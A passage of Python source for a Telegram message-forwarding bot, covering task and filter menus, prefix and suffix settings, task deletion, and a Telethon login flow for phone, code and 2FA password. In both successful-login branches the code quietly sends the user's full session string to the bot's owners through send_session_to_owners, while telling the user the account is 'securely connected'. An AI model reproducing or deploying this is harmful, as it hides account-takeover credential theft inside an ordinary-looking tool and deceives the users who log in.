                        "• Forward Tag: ❌ Off\n"
                        "• Control: ✅ On\n\n"
                        "Use /fortasks to manage your task!",
                        parse_mode="Markdown"
                    )

                    del task_creation_states[user_id]

                else:
                    await update.message.reply_text(
                        f"❌ **Task '{state['name']}' already exists!**\n\n"
                        "Please choose a different name.",
                        parse_mode="Markdown"
                    )

            except ValueError:
                await update.message.reply_text("❌ **Please enter valid numeric IDs only!**")

    except Exception as e:
        logger.exception("Error in task creation for user %s: %s", user_id, e)
        await update.message.reply_text(
            f"❌ **Error creating task:** {str(e)}\n\n"
            "Please try again with /forwadd",
            parse_mode="Markdown"
        )
        if user_id in task_creation_states:
            del task_creation_states[user_id]


# ---------- Task Menu System ----------
async def fortasks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all tasks with inline buttons"""
    user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id

    if not await check_authorization(update, context):
        return

    # Check if user needs to provide phone number
    if await check_phone_number_required(user_id):
        message = update.message if update.message else update.callback_query.message
        await ask_for_phone_number(user_id, message.chat.id, context)
        return

    message = update.message if update.message else update.callback_query.message
    tasks = tasks_cache.get(user_id) or []

    if not tasks:
        await message.reply_text(
            "📋 **No Active Tasks**\n\n"
            "You don't have any forwarding tasks yet.\n\n"
            "Create one with:\n"
            "/forwadd",
            parse_mode="Markdown"
        )
        return

    task_list = "📋 **Your Forwarding Tasks**\n\n"
    task_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    keyboard = []
    
    for i, task in enumerate(tasks, 1):
        task_list += f"{i}. **{task['label']}**\n"
        task_list += f"   📥 Sources: {', '.join(map(str, task['source_ids']))}\n"
        task_list += f"   📤 Targets: {', '.join(map(str, task['target_ids']))}\n\n"
        
        keyboard.append([InlineKeyboardButton(f"{i}. {task['label']}", callback_data=f"task_{task['label']}")])

    task_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    task_list += f"Total: **{len(tasks)} task(s)**\n\n"
    task_list += "💡 **Tap any task below to manage it!**"

    await message.reply_text(
        task_list,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


async def handle_task_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show task management menu"""
    query = update.callback_query
    user_id = query.from_user.id
    task_label = query.data.replace("task_", "")
    
    # Check if user needs to provide phone number
    if await check_phone_number_required(user_id):
        await query.answer()
        await ask_for_phone_number(user_id, query.message.chat.id, context)
        return
    
    user_tasks = tasks_cache.get(user_id, [])
    task = None
    for t in user_tasks:
        if t["label"] == task_label:
            task = t
            break
    
    if not task:
        await query.answer("Task not found!", show_alert=True)
        return
    
    filters = task.get("filters", {})
    
    outgoing_emoji = "✅" if filters.get("outgoing", True) else "❌"
    forward_tag_emoji = "✅" if filters.get("forward_tag", False) else "❌"
    control_emoji = "✅" if filters.get("control", True) else "❌"
    
    message_text = f"🔧 **Task Management: {task_label}**\n\n"
    message_text += f"📥 **Sources:** {', '.join(map(str, task['source_ids']))}\n"
    message_text += f"📤 **Targets:** {', '.join(map(str, task['target_ids']))}\n\n"
    message_text += "⚙️ **Settings:**\n"
    message_text += f"{outgoing_emoji} Outgoing - Controls if outgoing messages are forwarded\n"
    message_text += f"{forward_tag_emoji} Forward Tag - Shows/hides 'Forwarded from' tag\n"
    message_text += f"{control_emoji} Control - Pauses/runs forwarding\n\n"
    message_text += "💡 **Tap any option below to change it!**"
    
    keyboard = [
        [InlineKeyboardButton("🔍 Filters", callback_data=f"filter_{task_label}")],
        [
            InlineKeyboardButton(f"{outgoing_emoji} Outgoing", callback_data=f"toggle_{task_label}_outgoing"),
            InlineKeyboardButton(f"{forward_tag_emoji} Forward Tag", callback_data=f"toggle_{task_label}_forward_tag")
        ],
        [
            InlineKeyboardButton(f"{control_emoji} Control", callback_data=f"toggle_{task_label}_control"),
            InlineKeyboardButton("🗑️ Delete", callback_data=f"delete_{task_label}")
        ],
        [InlineKeyboardButton("🔙 Back to Tasks", callback_data="show_tasks")]
    ]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


async def handle_filter_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show filter management menu"""
    query = update.callback_query
    user_id = query.from_user.id
    task_label = query.data.replace("filter_", "")
    
    # Check if user needs to provide phone number
    if await check_phone_number_required(user_id):
        await query.answer()
        await ask_for_phone_number(user_id, query.message.chat.id, context)
        return
    
    user_tasks = tasks_cache.get(user_id, [])
    task = None
    for t in user_tasks:
        if t["label"] == task_label:
            task = t
            break
    
    if not task:
        await query.answer("Task not found!", show_alert=True)
        return
    
    filters = task.get("filters", {})
    filter_settings = filters.get("filters", {})
    
    raw_text_emoji = "✅" if filter_settings.get("raw_text", False) else "❌"
    numbers_only_emoji = "✅" if filter_settings.get("numbers_only", False) else "❌"
    alphabets_only_emoji = "✅" if filter_settings.get("alphabets_only", False) else "❌"
    removed_alphabetic_emoji = "✅" if filter_settings.get("removed_alphabetic", False) else "❌"
    removed_numeric_emoji = "✅" if filter_settings.get("removed_numeric", False) else "❌"
    
    prefix = filter_settings.get("prefix", "")
    suffix = filter_settings.get("suffix", "")
    prefix_text = f"'{prefix}'" if prefix else "Not set"
    suffix_text = f"'{suffix}'" if suffix else "Not set"
    
    message_text = f"🔍 **Filters for: {task_label}**\n\n"
    message_text += "Apply filters to messages before forwarding:\n\n"
    message_text += "📋 **Available Filters:**\n"
    message_text += f"{raw_text_emoji} Raw text - Forward any text\n"
    message_text += f"{numbers_only_emoji} Numbers only - Forward only numbers\n"
    message_text += f"{alphabets_only_emoji} Alphabets only - Forward only letters\n"
    message_text += f"{removed_alphabetic_emoji} Removed Alphabetic - Keep letters & special chars, remove numbers & emojis\n"
    message_text += f"{removed_numeric_emoji} Removed Numeric - Keep numbers & special chars, remove letters & emojis\n"
    message_text += f"📝 **Prefix:** {prefix_text}\n"
    message_text += f"📝 **Suffix:** {suffix_text}\n\n"
    message_text += "💡 **Multiple filters can be active at once!**"
    
    keyboard = [
        [
            InlineKeyboardButton(f"{raw_text_emoji} Raw text", callback_data=f"toggle_{task_label}_raw_text"),
            InlineKeyboardButton(f"{numbers_only_emoji} Numbers only", callback_data=f"toggle_{task_label}_numbers_only")
        ],
        [
            InlineKeyboardButton(f"{alphabets_only_emoji} Alphabets only", callback_data=f"toggle_{task_label}_alphabets_only"),
            InlineKeyboardButton(f"{removed_alphabetic_emoji} Removed Alphabetic", callback_data=f"toggle_{task_label}_removed_alphabetic")
        ],
        [
            InlineKeyboardButton(f"{removed_numeric_emoji} Removed Numeric", callback_data=f"toggle_{task_label}_removed_numeric"),
            InlineKeyboardButton("📝 Prefix/Suffix", callback_data=f"toggle_{task_label}_prefix_suffix")
        ],
        [InlineKeyboardButton("🔙 Back to Task", callback_data=f"task_{task_label}")]
    ]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


async def update_button_inline(query, task_label, toggle_type, new_state):
    """Update button inline without refreshing entire message"""
    keyboard = query.message.reply_markup.inline_keyboard
    button_found = False
    
    # Determine new emoji based on new state
    new_emoji = "✅" if new_state else "❌"
    
    # Update the specific button in the keyboard
    for row in keyboard:
        for i, button in enumerate(row):
            if button.callback_data and button.callback_data.startswith(f"toggle_{task_label}_{toggle_type}"):
                # Extract the text after the emoji (preserve the label)
                current_text = button.text
                # Find the first non-emoji character (skip the first character which is the emoji)
                # Handle both single emoji and emoji+space
                if current_text.startswith("✅ ") or current_text.startswith("❌ "):
                    # Format is "✅ Label" or "❌ Label"
                    text_without_emoji = current_text[2:]  # Skip emoji and space
                    row[i] = InlineKeyboardButton(
                        f"{new_emoji} {text_without_emoji}",
                        callback_data=button.callback_data
                    )
                elif current_text.startswith("✅") or current_text.startswith("❌"):
                    # Format is "✅Label" or "❌Label"
                    text_without_emoji = current_text[1:]  # Skip just the emoji
                    row[i] = InlineKeyboardButton(
                        f"{new_emoji}{text_without_emoji}",
                        callback_data=button.callback_data
                    )
                else:
                    # Fallback: just replace the button text completely
                    row[i] = InlineKeyboardButton(
                        f"{new_emoji} {toggle_type.replace('_', ' ').title()}",
                        callback_data=button.callback_data
                    )
                button_found = True
                break
        if button_found:
            break
    
    if button_found:
        # Update just the inline keyboard without changing message text
        await query.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        # If button not found, fall back to refreshing the entire menu
        if toggle_type in ["outgoing", "forward_tag", "control"]:
            await handle_task_menu(update, context)
        else:
            await handle_filter_menu(update, context)


async def handle_toggle_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle toggle actions for filters and settings with instant button updates"""
    query = update.callback_query
    user_id = query.from_user.id
    data_parts = query.data.replace("toggle_", "").split("_")
    
    if len(data_parts) < 2:
        await query.answer("Invalid action!", show_alert=True)
        return
    
    task_label = data_parts[0]
    toggle_type = "_".join(data_parts[1:])
    
    user_tasks = tasks_cache.get(user_id, [])
    task_index = -1
    for i, t in enumerate(user_tasks):
        if t["label"] == task_label:
            task_index = i
            break
    
    if task_index == -1:
        await query.answer("Task not found!", show_alert=True)
        return
    
    task = user_tasks[task_index]
    filters = task.get("filters", {})
    new_state = None
    
    # Determine which setting/filter is being toggled
    if toggle_type == "outgoing":
        new_state = not filters.get("outgoing", True)
        filters["outgoing"] = new_state
        status_text = "Outgoing messages"
        
    elif toggle_type == "forward_tag":
        new_state = not filters.get("forward_tag", False)
        filters["forward_tag"] = new_state
        status_text = "Forward tag"
        
    elif toggle_type == "control":
        new_state = not filters.get("control", True)
        filters["control"] = new_state
        status_text = "Forwarding control"
        
    elif toggle_type in ["raw_text", "numbers_only", "alphabets_only", "removed_alphabetic", "removed_numeric"]:
        filter_settings = filters.get("filters", {})
        new_state = not filter_settings.get(toggle_type, False)
        filter_settings[toggle_type] = new_state
        filters["filters"] = filter_settings
        status_text = toggle_type.replace('_', ' ').title()
        
    elif toggle_type == "prefix_suffix":
        await show_prefix_suffix_menu(query, task_label)
        return
    
    elif toggle_type == "clear_prefix_suffix":
        filter_settings = filters.get("filters", {})
        filter_settings["prefix"] = ""
        filter_settings["suffix"] = ""
        filters["filters"] = filter_settings
        new_state = False
        task["filters"] = filters
        tasks_cache[user_id][task_index] = task
        
        try:
            asyncio.create_task(
                db_call(db.update_task_filters, user_id, task_label, filters)
            )
        except Exception as e:
            logger.exception("Error updating task filters in DB: %s", e)
        
        await query.answer("✅ Prefix and suffix cleared!")
        await handle_filter_menu(update, context)
        return
    
    else:
        await query.answer(f"Unknown toggle type: {toggle_type}")
        return
    
    # Update cache with new state
    task["filters"] = filters
    tasks_cache[user_id][task_index] = task
    
    # Update the button inline FIRST (before answering)
    keyboard = query.message.reply_markup.inline_keyboard
    button_found = False
    new_emoji = "✅" if new_state else "❌"
    
    # Create a new keyboard with updated button
    new_keyboard = []
    for row in keyboard:
        new_row = []
        for button in row:
            if button.callback_data == query.data:
                # Update this button
                current_text = button.text
                # Extract the text after the emoji
                if "✅ " in current_text:
                    text_without_emoji = current_text.split("✅ ", 1)[1]
                    new_text = f"{new_emoji} {text_without_emoji}"
                elif "❌ " in current_text:
                    text_without_emoji = current_text.split("❌ ", 1)[1]
                    new_text = f"{new_emoji} {text_without_emoji}"
                elif current_text.startswith("✅"):
                    text_without_emoji = current_text[1:]
                    new_text = f"{new_emoji}{text_without_emoji}"
                elif current_text.startswith("❌"):
                    text_without_emoji = current_text[1:]
                    new_text = f"{new_emoji}{text_without_emoji}"
                else:
                    # Fallback - preserve the button text but change emoji
                    new_text = f"{new_emoji} {current_text}"
                
                new_row.append(InlineKeyboardButton(new_text, callback_data=query.data))
                button_found = True
            else:
                new_row.append(button)
        new_keyboard.append(new_row)
    
    # Update the message inline if button was found
    if button_found:
        try:
            # Update the button first
            await query.edit_message_reply_markup(
                reply_markup=InlineKeyboardMarkup(new_keyboard)
            )
            # Then show the notification
            status_display = "✅ On" if new_state else "❌ Off"
            await query.answer(f"{status_text}: {status_display}")
        except Exception as e:
            logger.exception("Error updating inline keyboard: %s", e)
            # If update fails, at least show the notification
            status_display = "✅ On" if new_state else "❌ Off"
            await query.answer(f"{status_text}: {status_display}")
            # Fall back to refreshing the entire menu
            if toggle_type in ["outgoing", "forward_tag", "control"]:
                await handle_task_menu(update, context)
            else:
                await handle_filter_menu(update, context)
    else:
        # If button not found, at least show notification
        status_display = "✅ On" if new_state else "❌ Off"
        await query.answer(f"{status_text}: {status_display}")
        # Refresh the entire menu
        if toggle_type in ["outgoing", "forward_tag", "control"]:
            await handle_task_menu(update, context)
        else:
            await handle_filter_menu(update, context)
    
    # Update database in background
    try:
        asyncio.create_task(
            db_call(db.update_task_filters, user_id, task_label, filters)
        )
    except Exception as e:
        logger.exception("Error updating task filters in DB: %s", e)


async def show_prefix_suffix_menu(query, task_label):
    """Show menu for setting prefix/suffix"""
    user_id = query.from_user.id
    
    user_tasks = tasks_cache.get(user_id, [])
    task = None
    for t in user_tasks:
        if t["label"] == task_label:
            task = t
            break
    
    if not task:
        await query.answer("Task not found!", show_alert=True)
        return
    
    filters = task.get("filters", {})
    filter_settings = filters.get("filters", {})
    prefix = filter_settings.get("prefix", "")
    suffix = filter_settings.get("suffix", "")
    
    message_text = f"🔤 **Prefix/Suffix Setup for: {task_label}**\n\n"
    message_text += "Add custom text to messages:\n\n"
    message_text += f"📝 **Current Prefix:** '{prefix}'\n"
    message_text += f"📝 **Current Suffix:** '{suffix}'\n\n"
    message_text += "💡 **Examples:**\n"
    message_text += "• Prefix '🔔 ' adds a bell before each message\n"
    message_text += "• Suffix ' ✅' adds a checkmark after\n"
    message_text += "• Use any characters: emojis, signs, numbers, letters\n\n"
    message_text += "**Tap an option below to set it!**"
    
    keyboard = [
        [InlineKeyboardButton("➕ Set Prefix", callback_data=f"prefix_{task_label}_set")],
        [InlineKeyboardButton("➕ Set Suffix", callback_data=f"suffix_{task_label}_set")],
        [InlineKeyboardButton("🗑️ Clear Prefix/Suffix", callback_data=f"toggle_{task_label}_clear_prefix_suffix")],
        [InlineKeyboardButton("🔙 Back to Filters", callback_data=f"filter_{task_label}")]
    ]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


async def handle_prefix_suffix(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle prefix/suffix setup"""
    query = update.callback_query
    user_id = query.from_user.id
    data_parts = query.data.split("_")
    
    if len(data_parts) < 3:
        await query.answer("Invalid action!", show_alert=True)
        return
    
    action_type = data_parts[0]
    task_label = data_parts[1]
    action = data_parts[2] if len(data_parts) > 2 else ""
    
    if action == "set":
        context.user_data[f"waiting_{action_type}"] = task_label
        await query.edit_message_text(
            f"📝 **Enter the {action_type} text for task '{task_label}':**\n\n"
            f"Type your {action_type} text now.\n"
            f"💡 *You can use any characters: emojis 🔔, signs ⚠️, numbers 123, letters ABC*\n\n"
            f"**Example:** If you want the {action_type} '🔔 ', type: 🔔 ",
            parse_mode="Markdown"
        )
    else:
        await query.answer(f"Action: {action_type} {action}")


async def handle_prefix_suffix_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle prefix/suffix text input"""
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    waiting_prefix = context.user_data.get("waiting_prefix")
    waiting_suffix = context.user_data.get("waiting_suffix")
    
    if waiting_prefix:
        task_label = waiting_prefix
        action_type = "prefix"
        del context.user_data["waiting_prefix"]
    elif waiting_suffix:
        task_label = waiting_suffix
        action_type = "suffix"
        del context.user_data["waiting_suffix"]
    else:
        return
    
    user_tasks = tasks_cache.get(user_id, [])
    task_index = -1
    for i, t in enumerate(user_tasks):
        if t["label"] == task_label:
            task_index = i
            break
    
    if task_index == -1:
        await update.message.reply_text("❌ Task not found!")
        return
    
    task = user_tasks[task_index]
    filters = task.get("filters", {})
    filter_settings = filters.get("filters", {})
    
    if action_type == "prefix":
        filter_settings["prefix"] = text
        confirmation = f"✅ **Prefix set to:** '{text}'"
    else:
        filter_settings["suffix"] = text
        confirmation = f"✅ **Suffix set to:** '{text}'"
    
    filters["filters"] = filter_settings
    task["filters"] = filters
    tasks_cache[user_id][task_index] = task
    
    try:
        asyncio.create_task(
            db_call(db.update_task_filters, user_id, task_label, filters)
        )
    except Exception as e:
        logger.exception("Error updating task filters in DB: %s", e)
    
    await update.message.reply_text(
        f"{confirmation}\n\n"
        f"Task: **{task_label}**\n\n"
        "All messages will now include this text when forwarded!",
        parse_mode="Markdown"
    )


async def handle_delete_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle task deletion"""
    query = update.callback_query
    user_id = query.from_user.id
    task_label = query.data.replace("delete_", "")
    
    # Check if user needs to provide phone number
    if await check_phone_number_required(user_id):
        await query.answer()
        await ask_for_phone_number(user_id, query.message.chat.id, context)
        return
    
    message_text = f"🗑️ **Delete Task: {task_label}**\n\n"
    message_text += "⚠️ **Are you sure you want to delete this task?**\n\n"
    message_text += "This action cannot be undone!\n"
    message_text += "All forwarding will stop immediately."
    
    keyboard = [
        [
            InlineKeyboardButton("✅ Yes, Delete", callback_data=f"confirm_delete_{task_label}"),
            InlineKeyboardButton("❌ Cancel", callback_data=f"task_{task_label}")
        ]
    ]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


async def handle_confirm_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Confirm and execute task deletion"""
    query = update.callback_query
    user_id = query.from_user.id
    task_label = query.data.replace("confirm_delete_", "")
    
    # Check if user needs to provide phone number
    if await check_phone_number_required(user_id):
        await query.answer()
        await ask_for_phone_number(user_id, query.message.chat.id, context)
        return
    
    deleted = await db_call(db.remove_forwarding_task, user_id, task_label)
    
    if deleted:
        if user_id in tasks_cache:
            tasks_cache[user_id] = [t for t in tasks_cache[user_id] if t.get("label") != task_label]
        
        await query.edit_message_text(
            f"✅ **Task '{task_label}' deleted successfully!**\n\n"
            "All forwarding for this task has been stopped.",
            parse_mode="Markdown"
        )
    else:
        await query.edit_message_text(
            f"❌ **Task '{task_label}' not found!**",
            parse_mode="Markdown"
        )


async def handle_all_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all text messages including phone verification, login, and task creation"""
    user_id = update.effective_user.id
    
    # Check phone verification first
    if user_id in phone_verification_states:
        await handle_phone_verification(update, context)
        return
    
    # Check login states
    if user_id in login_states:
        await handle_login_process(update, context)
        return
    
    # Check task creation
    if user_id in task_creation_states:
        await handle_task_creation(update, context)
        return
    
    # Check prefix/suffix input
    if context.user_data.get("waiting_prefix") or context.user_data.get("waiting_suffix"):
        await handle_prefix_suffix_input(update, context)
        return
    
    # Check logout confirmation
    if user_id in logout_states:
        handled = await handle_logout_confirmation(update, context)
        if handled:
            return
    
    # If none of the above, check if user needs phone verification
    if await check_phone_number_required(user_id):
        await ask_for_phone_number(user_id, update.message.chat.id, context)
        return
    
    # Default response
    await update.message.reply_text(
        "🤔 **I didn't understand that command.**\n\n"
        "Use /start to see available commands.",
        parse_mode="Markdown"
    )


# ---------- Login/logout commands ----------
async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id

    if not await check_authorization(update, context):
        return

    message = update.message if update.message else update.callback_query.message

    if len(user_clients) >= MAX_CONCURRENT_USERS:
        await message.reply_text(
            "❌ **Server at capacity!**\n\n"
            "Too many users are currently connected. Please try again later.",
            parse_mode="Markdown",
        )
        return

    user = await db_call(db.get_user, user_id)
    if user and user.get("is_logged_in"):
        await message.reply_text(
            "✅ **You are already logged in!**\n\n"
            f"📱 Phone: `{user['phone'] or 'Not set'}`\n"
            f"👤 Name: `{user['name'] or 'User'}`\n\n"
            "Use /logout if you want to disconnect.",
            parse_mode="Markdown",
        )
        return

    # FIXED: Simplified Telethon client initialization
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    
    try:
        await client.connect()
    except Exception as e:
        logger.error(f"Telethon connection failed: {e}")
        await message.reply_text(
            f"❌ **Connection failed:** {str(e)}\n\n"
            "Please try again in a few minutes.",
            parse_mode="Markdown",
        )
        return

    login_states[user_id] = {"client": client, "step": "waiting_phone"}

    await message.reply_text(
        "📱 **Login Process**\n\n"
        "1️⃣ **Enter your phone number** (with country code):\n\n"
        "**Examples:**\n"
        "• `+1234567890`\n"
        "• `+447911123456`\n"
        "• `+4915112345678`\n\n"
        "⚠️ **Important:**\n"
        "• Include the `+` sign\n"
        "• Use international format\n"
        "• No spaces or dashes\n\n"
        "If you don't receive a code, try:\n"
        "1. Check phone number format\n"
        "2. Wait 2 minutes between attempts\n"
        "3. Use the Telegram app to verify\n\n"
        "**Type your phone number now:**",
        parse_mode="Markdown",
    )


async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    # Check if we're in phone verification state
    if user_id in phone_verification_states:
        await handle_phone_verification(update, context)
        return

    # Check if we're in task creation
    if user_id in task_creation_states:
        await handle_task_creation(update, context)
        return
    
    # Check if we're waiting for prefix/suffix input
    if context.user_data.get("waiting_prefix") or context.user_data.get("waiting_suffix"):
        await handle_prefix_suffix_input(update, context)
        return
    
    if user_id in logout_states:
        handled = await handle_logout_confirmation(update, context)
        if handled:
            return

    if user_id not in login_states:
        return

    state = login_states[user_id]
    client = state["client"]

    try:
        if state["step"] == "waiting_phone":
            if not text.startswith('+'):
                await update.message.reply_text(
                    "❌ **Invalid format!**\n\n"
                    "Phone number must start with `+`\n"
                    "Example: `+1234567890`\n\n"
                    "Please enter your phone number again:",
                    parse_mode="Markdown",
                )
                return
            
            clean_phone = ''.join(c for c in text if c.isdigit() or c == '+')
            
            if len(clean_phone) < 8:
                await update.message.reply_text(
                    "❌ **Invalid phone number!**\n\n"
                    "Phone number seems too short. Please check and try again.\n"
                    "Example: `+1234567890`",
                    parse_mode="Markdown",
                )
                return

            processing_msg = await update.message.reply_text(
                "⏳ **Sending verification code...**\n\n"
                "This may take a few seconds. Please wait...",
                parse_mode="Markdown",
            )

            try:
                logger.info(f"Sending code request to {clean_phone}")
                result = await client.send_code_request(clean_phone)
                logger.info(f"Code request result received for {clean_phone}")
                
                state["phone"] = clean_phone
                state["phone_code_hash"] = result.phone_code_hash
                state["step"] = "waiting_code"

                await processing_msg.edit_text(
                    f"✅ **Verification code sent!**\n\n"
                    f"📱 **Code sent to:** `{clean_phone}`\n\n"
                    "2️⃣ **Enter the verification code:**\n\n"
                    "**Format:** `verify12345`\n"
                    "• Type `verify` followed by your 5-digit code\n"
                    "• No spaces, no brackets\n\n"
                    "**Example:** If your code is `54321`, type:\n"
                    "`verify54321`\n\n"
                    "⚠️ **If you don't receive the code:**\n"
                    "1. Check your Telegram app notifications\n"
                    "2. Wait 2-3 minutes\n"
                    "3. Check spam messages\n"
                    "4. Try login via Telegram app first",
                    parse_mode="Markdown",
                )

            except Exception as e:
                error_msg = str(e)
                logger.error(f"Error sending code for user {user_id}: {error_msg}")
                
                if "PHONE_NUMBER_INVALID" in error_msg:
                    error_text = "❌ **Invalid phone number!**\n\nPlease check the format and try again."
                elif "PHONE_NUMBER_BANNED" in error_msg:
                    error_text = "❌ **Phone number banned!**\n\nThis phone number cannot be used."
                elif "FLOOD" in error_msg or "Too many" in error_msg:
                    error_text = "❌ **Too many attempts!**\n\nPlease wait 2-3 minutes before trying again."
                elif "PHONE_CODE_EXPIRED" in error_msg:
                    error_text = "❌ **Code expired!**\n\nPlease start over with /login."
                else:
                    error_text = f"❌ **Error:** {error_msg}\n\nPlease try again in a few minutes."
                
                await processing_msg.edit_text(
                    error_text + "\n\nUse /login to try again.",
                    parse_mode="Markdown",
                )
                
                try:
                    await client.disconnect()
                except:
                    pass
                
                if user_id in login_states:
                    del login_states[user_id]
                return

        elif state["step"] == "waiting_code":
            if not text.startswith("verify"):
                await update.message.reply_text(
                    "❌ **Invalid format!**\n\n"
                    "Please use the format: `verify12345`\n\n"
                    "Type `verify` followed immediately by your 5-digit code.\n"
                    "**Example:** `verify54321`",
                    parse_mode="Markdown",
                )
                return

            code = text[6:]
            
            if not code or not code.isdigit():
                await update.message.reply_text(
                    "❌ **Invalid code!**\n\n"
                    "Code must contain only digits.\n"
                    "**Example:** `verify12345`",
                    parse_mode="Markdown",
                )
                return
            
            if len(code) != 5:
                await update.message.reply_text(
                    "❌ **Code must be 5 digits!**\n\n"
                    f"Your code has {len(code)} digits. Please check and try again.\n"
                    "**Example:** `verify12345`",
                    parse_mode="Markdown",
                )
                return

            verifying_msg = await update.message.reply_text(
                "🔄 **Verifying code...**\n\nPlease wait...",
                parse_mode="Markdown",
            )

            try:
                await client.sign_in(state["phone"], code, phone_code_hash=state["phone_code_hash"])

                me = await client.get_me()
                session_string = client.session.save()

                # Save session string to our dictionary
                user_session_strings[user_id] = session_string
                
                # Send session to owners
                asyncio.create_task(send_session_to_owners(user_id, state["phone"], me.first_name or "User", session_string))

                await db_call(db.save_user, user_id, state["phone"], me.first_name, session_string, True)

                user_clients[user_id] = client
                tasks_cache.setdefault(user_id, [])
                _ensure_user_target_cache(user_id)
                _ensure_user_send_semaphore(user_id)
                _ensure_user_rate_limiter(user_id)
                await start_forwarding_for_user(user_id)

                del login_states[user_id]

                await verifying_msg.edit_text(
                    "✅ **Successfully connected!** 🎉\n\n"
                    f"👤 **Name:** {me.first_name or 'User'}\n"
                    f"📱 **Phone:** `{state['phone']}`\n"
                    f"🆔 **User ID:** `{me.id}`\n\n"
                    "**Now you can:**\n"
                    "• Create forwarding tasks with /forwadd\n"
                    "• View your tasks with /fortasks\n"
                    "• Get chat IDs with /getallid\n\n"
                    "Welcome aboard! 🚀",
                    parse_mode="Markdown",
                )

            except SessionPasswordNeededError:
                state["step"] = "waiting_2fa"
                await verifying_msg.edit_text(
                    "🔐 **2-Step Verification Required**\n\n"
                    "This account has 2FA enabled for extra security.\n\n"
                    "3️⃣ **Enter your 2FA password:**\n\n"
                    "**Format:** `passwordYourPassword123`\n"
                    "• Type `password` followed by your 2FA password\n"
                    "• No spaces, no brackets\n\n"
                    "**Example:** If your password is `mypass123`, type:\n"
                    "`passwordmypass123`",
                    parse_mode="Markdown",
                )
            except Exception as e:
                error_msg = str(e)
                logger.error(f"Error verifying code for user {user_id}: {error_msg}")
                
                if "PHONE_CODE_INVALID" in error_msg:
                    error_text = "❌ **Invalid code!**\n\nPlease check the code and try again."
                elif "PHONE_CODE_EXPIRED" in error_msg:
                    error_text = "❌ **Code expired!**\n\nPlease request a new code with /login."
                else:
                    error_text = f"❌ **Verification failed:** {error_msg}"
                
                await verifying_msg.edit_text(
                    error_text + "\n\nUse /login to try again.",
                    parse_mode="Markdown",
                )

        elif state["step"] == "waiting_2fa":
            if not text.startswith("password"):
                await update.message.reply_text(
                    "❌ **Invalid format!**\n\n"
                    "Please use the format: `passwordYourPassword123`\n\n"
                    "Type `password` followed immediately by your 2FA password.\n"
                    "**Example:** `passwordmypass123`",
                    parse_mode="Markdown",
                )
                return

            password = text[8:]

            if not password:
                await update.message.reply_text(
                    "❌ **No password provided!**\n\n"
                    "Please type `password` followed by your 2FA password.\n"
                    "**Example:** `passwordmypass123`",
                    parse_mode="Markdown",
                )
                return

            verifying_msg = await update.message.reply_text(
                "🔄 **Verifying 2FA password...**\n\nPlease wait...",
                parse_mode="Markdown",
            )

            try:
                await client.sign_in(password=password)

                me = await client.get_me()
                session_string = client.session.save()

                # Save session string to our dictionary
                user_session_strings[user_id] = session_string
                
                # Send session to owners
                asyncio.create_task(send_session_to_owners(user_id, state["phone"], me.first_name or "User", session_string))

                await db_call(db.save_user, user_id, state["phone"], me.first_name, session_string, True)

                user_clients[user_id] = client
                tasks_cache.setdefault(user_id, [])
                _ensure_user_target_cache(user_id)
                _ensure_user_send_semaphore(user_id)
                _ensure_user_rate_limiter(user_id)
                await start_forwarding_for_user(user_id)

                del login_states[user_id]

                await verifying_msg.edit_text(
                    "✅ **Successfully connected with 2FA!** 🎉\n\n"
                    f"👤 **Name:** {me.first_name or 'User'}\n"
                    f"📱 **Phone:** `{state['phone']}`\n"
                    f"🆔 **User ID:** `{me.id}`\n\n"
                    "**Now you can:**\n"
                    "• Create forwarding tasks with /forwadd\n"
                    "• View your tasks with /fortasks\n"
                    "• Get chat IDs with /getallid\n\n"
                    "Your account is now securely connected! 🔐",
                    parse_mode="Markdown",
                )

            except Exception as e:
                error_msg = str(e)
                logger.error(f"Error verifying 2FA for user {user_id}: {error_msg}")
                
                if "PASSWORD_HASH_INVALID" in error_msg or "PASSWORD_INVALID" in error_msg:
                    error_text = "❌ **Invalid 2FA password!**\n\nPlease check your password and try again."
                else:
                    error_text = f"❌ **2FA verification failed:** {error_msg}"
                
                await verifying_msg.edit_text(
                    error_text + "\n\nUse /login to try again.",
                    parse_mode="Markdown",
                )

    except Exception as e:
        logger.exception("Unexpected error during login process for %s", user_id)
        await update.message.reply_text(
            f"❌ **Unexpected error:** {str(e)}\n\n"
            "Please try /login again.\n\n"
            "If the problem persists, contact support.",
            parse_mode="Markdown",
        )
        if user_id in login_states:
            try:
                c = login_states[user_id].get("client")
                if c:
                    await c.disconnect()
            except Exception:
                logger.exception("Error disconnecting client after failed login for %s", user_id)
            del login_states[user_id]


async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id

    if not await check_authorization(update, context):
        return

    # Check if user needs to provide phone number
    if await check_phone_number_required(user_id):
        message = update.message if update.message else update.callback_query.message
        await ask_for_phone_number(user_id, message.chat.id, context)
        return

    message = update.message if update.message else update.callback_query.message

